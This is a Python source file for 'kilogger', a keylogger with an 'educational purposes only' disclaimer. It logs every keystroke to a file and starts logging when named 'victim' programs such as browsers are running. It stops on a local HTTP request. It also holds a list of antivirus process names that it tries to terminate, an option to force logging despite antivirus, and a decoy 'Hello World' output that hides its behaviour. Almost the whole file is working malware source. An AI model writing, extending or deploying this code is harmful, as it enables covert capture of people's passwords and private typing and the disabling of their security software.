"""
kilogger: A Keylogger Utility for Educational Purposes

Functionalities:
- Capture and log pressed keys.
- Watch processes to trigger keylogger.
- Log clipboard data.
- Stop logger with an HTTP request.

Disclaimer:
kilogger is intended for educational purposes only. It is not designed
for malicious use or unauthorized access. By using this project, you
agree to use it responsibly and ethically.
The developers of this project are not responsible for any misuse of
this tool, and users are responsible for their actions. This project
is provided "as is" without warranties.

Author: Antonino Lorenzo
Version: 1.0.0


TODO [x]: stop logging when target is closed
TODO [ ]: Work on logging format
    what should be the output? (ex. date - running targets - input)
    can the output be buffered?
TODO [x]: debug ListenerSocket
TODO [x]: fix pylint
TODO [x]: fix pycharm
TODO [x]: complete docs in code
TODO [ ]: Implement capture copy to clipboard functionality
"""

import sys
import time
import socket
import argparse
import logging
from threading import Thread, Event

from kilogger import (
    LOGLOC,
    DEFAULT_TIMEOUT,
    install_package,
    verify_package_installation
)

#  Import/Install dependencies
try:
    import psutil
except ImportError:
    install_package('psutil')
    if not verify_package_installation('psutil'):
        sys.exit(1)
    else:
        import psutil

try:
    from pynput.keyboard import Listener
except ImportError:
    install_package('pynput')
    if not verify_package_installation('pynput'):
        sys.exit(1)
    else:
        from pynput.keyboard import Listener


class StringToList(argparse.Action):
    """Convert comma-separated string to list"""

    def __call__(self, parser, namespace, values, option_string=None):
        values = list(map(lambda val: val.strip(), values.split(', ')))
        setattr(namespace, self.dest, values)


class KLogger(Thread):
    """Wrapper around pynput.keyboard.Listener"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.__k_listener = Listener(on_press=KLogger._action)
        self.__k_listener.daemon = True

    def run(self):
        """Run KLogger daemon"""
        self.__k_listener.start()

    def stop(self):
        """Stop KLogger daemon"""
        self.__k_listener.stop()

    @staticmethod
    def _action(key):
        """Called by pynput.keyboard.Listener when a button is pressed"""
        logging.info(str(key))


class KLoggerFactory:
    """Handles execution of KLogger threads"""
    def __init__(self):
        self.__current: KLogger | None = None

    def start(self):
        """Starts a new KLogger thread"""
        if not self.__current:
            self.__current = KLogger()
            self.__current.start()

    def stop(self):
        """Stops the current running KLogger thread"""
        if self.__current:
            self.__current.stop()
            self.__current = None


class ProcessListener(Thread):
    """
    Runs in background until victim executes a program in the "targets" list.
    """
    RUNNING = 'Running'
    NOT_RUNNING = 'Not Running'
    STOP = '/terminate'

    def __init__(self, targets: list, factory: KLoggerFactory, *args,
                 sleep: int = 10, **kwargs):
        super().__init__(*args, **kwargs)

        self.__targets = {t: ProcessListener.NOT_RUNNING for t in targets}
        self.__logger_factory = factory
        self.__logger_status = ProcessListener.NOT_RUNNING
        self.__sleep = sleep
        self.__stop_event = Event()
        self.daemon = True

    def find_process(self):
        """Updates the status [RUNNING, NOT_RUNNING] of the target processes"""
        snapshot = [p.name().lower() for p in psutil.process_iter(['name'])]
        for tr_process in self.__targets.keys():
            if tr_process in snapshot:
                self.__targets[tr_process] = ProcessListener.RUNNING
            else:
                self.__targets[tr_process] = ProcessListener.NOT_RUNNING

    def run(self):
        """
        Checks if the target process is running every `sleep` seconds,
        updates the status [RUNNING, NOT_RUNNING] of the target processes
        and if one of them is running it starts a KLogger with KLoggerFactory.
        """
        while True:
            self.find_process()
            active_count = 0
            for tr_process, status in self.__targets.items():
                logging.info(f'{status}: {tr_process}.')

                if status == ProcessListener.RUNNING:
                    active_count += 1

                # found target process in running processes => start logging
                if (status == ProcessListener.RUNNING and
                        self.__logger_status == ProcessListener.NOT_RUNNING):
                    self.__logger_status = ProcessListener.RUNNING
                    self.__logger_factory.start()

            logging.info(f'Active targets: {active_count}')
            if (active_count == 0 and
                    self.__logger_status == ProcessListener.RUNNING):
                self.__logger_factory.stop()

            # wait to re-execute check
            time.sleep(self.__sleep)

    def stop(self):
        """Called when the termination signal is sent to ListenerSocket."""
        if self.__logger_status == ProcessListener.RUNNING:
            self.__logger_factory.stop()
        self.__stop_event.set()


class ListenerSocket:
    """
    Used to stop ProcessListener.
    curl http://127.0.0.1:65432/terminate
    """
    HOST = '127.0.0.1'
    PORT = 65432

    def __init__(self, process_listener: ProcessListener):
        self.__process_listener = process_listener

        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.bind((ListenerSocket.HOST, ListenerSocket.PORT))
        self.__sock.listen()
        self.__running = True

        while self.__running:
            conn, addr = self.__sock.accept()
            self.handle(conn, addr)

    def handle(self, conn, addr):
        """
        Responsible for parsing requests, there are two possible outcomes:
        - A request made to any path different to /terminate has no return.
        - A request made to /terminate stops process listener and socket.
        """
        try:
            while True:
                data = conn.recv(1024)
                if not data:
                    break

                request = data.decode('utf-8')
                request_line, headers = request.split('\r\n', 1)
                if ProcessListener.STOP in request_line:
                    self.__process_listener.stop()
                    message = 'Closed'
                    response = (f"HTTP/1.1 200 OK\r\n"
                                f"Content-Type: text/plain\r\n"
                                f"Content-Length: {len(message)}\r\n\r\n{message}")
                    conn.send(response.encode('utf-8'))
                    conn.close()
                    if self.__sock:
                        self.__running = False
                        self.__sock.close()
                    break
                else:
                    conn.close()
        except OSError:
            pass  # skip requests to paths that aren't /terminate


def friendly_check():
    """
    TODO: improve or remove
    """
    # some 'friends' that must be checked
    target_friends = ['msmpeng.exe', 'avgnt.exe', 'avp.exe',
                      'avg.exe', 'bitdefender.exe', 'comodo.exe',
                      'eset.exe', 'f-secure.exe', 'kaspersky.exe',
                      'norton.exe', 'panda.exe', 'sophos.exe',
                      'symantec.exe', 'trendmicro.exe', 'windefender.exe'
                      ]

    target_found = False
    target_killed = False
    for proc in psutil.process_iter(['name']):
        if proc.name().lower() in target_friends:
            target_found = True
            try:
                # terminate always founds a friend but is
                # never able to say goodbye to him :(
                proc.terminate()
                target_killed = True
            except psutil.AccessDenied:
                target_killed = False
    return target_killed or target_found


def main():
    """
    Main function of the kilogger program.
    """
    # --- Setup argparse
    parser = argparse.ArgumentParser()

    parser.add_argument(
        '--force',
        type=int, choices=[0, 1],
        default=None,
        help='0: do not force logger if AV is on. 1: fuck it'
    )

    parser.add_argument(
        '--targets',
        action=StringToList,
        default=[],
        help=
        'Name of target processes (ex. "chrome.exe, firefox.exe"); '
        'note: process names should be separated by ", ".'
    )

    args = parser.parse_args()
    if ((not (args.force and args.force == 1))
            and friendly_check()):  # big brain time
        print('Hello World')
    else:
        logging.basicConfig(filename=LOGLOC, level=logging.DEBUG)

        # --- Run logger
        logger_factory = KLoggerFactory()
        if args.targets:
            proc_listener = ProcessListener(
                args.targets,
                sleep=DEFAULT_TIMEOUT,
                factory=logger_factory
            )
            proc_listener.start()
            ListenerSocket(proc_listener)
        else:
            # TODO: handle stop maybe with "with"
            logger_factory.start()


if __name__ == "__main__":
    main()
